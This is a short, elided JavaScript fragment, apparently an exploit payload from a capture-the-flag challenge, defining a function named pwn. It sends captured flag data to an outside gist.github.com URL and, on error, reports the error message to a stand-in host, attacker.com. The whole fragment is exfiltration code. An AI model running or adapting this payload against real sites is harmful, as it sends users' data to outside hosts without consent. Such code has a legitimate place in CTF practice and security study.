...
async function pwn() {
  try {
    ...
    await fetch('https://gist.github.com/mod-siw/88244742405bf5695faddc6a6fcc38ab/?flag=' + encodeURIComponent(flagData));

  } catch (e) {
    // 디버깅용 에러 전송 
    await fetch('https://attacker.com/?error=' + encodeURIComponent(e.message));
  }
}
